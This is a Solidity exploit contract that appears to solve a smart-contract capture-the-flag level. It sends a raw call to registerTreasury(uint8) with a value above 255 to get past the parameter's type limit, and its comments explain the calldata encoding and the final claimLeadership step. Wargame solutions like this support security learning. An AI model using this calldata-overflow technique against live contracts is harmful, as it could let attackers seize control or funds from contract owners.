// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract Attack{

    function attack(address higherOrder, uint256 num)external{

        require(num>255, "Number has to be greater than 255!");
        address(higherOrder).call(abi.encodeWithSignature("registerTreasury(uint8)", num));
        // we called function attack with num=256
        // 256 == 100(hex)
        // call data will be 0x211c85ab0000000000000000000000000000000000000000000000000000000000000100
        // first 4 bytes are function selector of the function registerTreasury()
        // next 32 bytes are the value that will be taken for treasury
        //
        
    }
    //to completely solve this level we just have to call the function claimLeadership()
    //form our EOA
}